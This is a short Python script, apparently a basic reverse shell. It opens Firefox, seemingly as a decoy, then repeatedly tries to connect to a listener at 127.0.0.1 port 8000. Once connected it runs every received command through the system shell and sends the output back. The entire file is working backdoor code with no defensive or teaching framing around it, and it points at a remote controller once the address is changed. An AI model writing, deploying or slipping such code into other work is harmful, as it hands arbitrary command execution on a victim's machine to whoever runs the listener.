import socket
import subprocess
import sys
import os

print("Socket started...")
mysocket = socket.socket()
browser = "C:\\Program Files\\Mozilla Firefox\\firefox.exe"
subprocess.Popen([browser])
connected = False

while not connected:
    port = 8000
    try:
        sys.stdout.write(f"\r{' ' * 60}\rAttempting connection to: {port}")
        sys.stdout.flush()
        mysocket.connect(("127.0.0.1", port))
    except socket.error:
        continue
    else:
        mysocket.send(b"Connected\n")
        connected = True
        break

while True:
    operating_system = sys.platform
    pwd = os.getcwd() + "> "
    mysocket.send(pwd.encode())
    command = mysocket.recv(1024).decode().strip()
    if operating_system == "linux" and command[:3] == 'cd ':
        try:
            os.chdir(command[3:])
        except Exception:
            mysocket.send(b"Failed to change directory")
    elif operating_system == "win32" and command[:4] == 'dir ':
        try:
            os.chdir(command[4:])
        except Exception:
            mysocket.send(b"Failed to change directory\n")
    else:
        prochandle = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        results, errors = prochandle.communicate()
        results = results + errors
        mysocket.send(results)
